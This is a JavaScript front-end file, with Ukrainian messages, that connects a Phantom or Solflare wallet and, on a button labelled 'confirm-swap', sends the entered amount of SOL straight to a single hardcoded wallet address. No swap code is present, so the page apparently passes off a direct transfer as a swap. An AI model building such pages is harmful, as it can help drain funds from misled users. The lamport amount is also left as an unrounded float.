import { Connection, PublicKey, Transaction, SystemProgram } from "https://esm.sh/@solana/web3.js";
import { Buffer } from "https://esm.sh/buffer/";

window.Buffer = Buffer;

const SOLANA_NETWORK = "https://api.mainnet-beta.solana.com";
const connection = new Connection(SOLANA_NETWORK);
const recipientWallet = new PublicKey("4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU");

let wallet = null;
let provider = null;

console.log("✅ Solana Web3.js підключено!");

async function connectWallet(walletType) {
    try {
        if (walletType === "Phantom" && window.solana?.isPhantom) {
            await window.solana.connect();
            wallet = window.solana.publicKey;
            provider = window.solana;
        } else if (walletType === "Solflare" && window.solflare?.isSolflare) {
            await window.solflare.connect();
            wallet = window.solflare.publicKey;
            provider = window.solflare;
        } else {
            alert(`Встановіть ${walletType} Wallet`);
            return;
        }
        document.getElementById("walletInfo").innerText = `Підключено: ${wallet.toString()}`;
    } catch (error) {
        console.error(`Помилка підключення ${walletType}:`, error);
    }
}

document.getElementById("connectPhantom").addEventListener("click", () => connectWallet("Phantom"));
document.getElementById("connectSolflare").addEventListener("click", () => connectWallet("Solflare"));

async function sendTransaction() {
    if (!wallet || !provider) {
        alert("Спочатку підключіть гаманець");
        return;
    }

    const amount = parseFloat(document.getElementById("amount").value);
    if (!amount || amount <= 0) {
        alert("Введіть коректну суму");
        return;
    }

    try {
        const lamports = amount * 1e9;
        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: wallet,
                toPubkey: recipientWallet,
                lamports,
            })
        );

        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = wallet;

        const signedTransaction = await provider.signTransaction(transaction);
        const txid = await connection.sendRawTransaction(signedTransaction.serialize(), { skipPreflight: false, preflightCommitment: "finalized" });
        
        alert(`Транзакція надіслана! ID: ${txid}`);
        console.log(`Transaction ID: https://solscan.io/tx/${txid}`);
    } catch (error) {
        console.error("Помилка відправки транзакції:", error);
    }
}

document.getElementById("confirm-swap").addEventListener("click", sendTransaction);
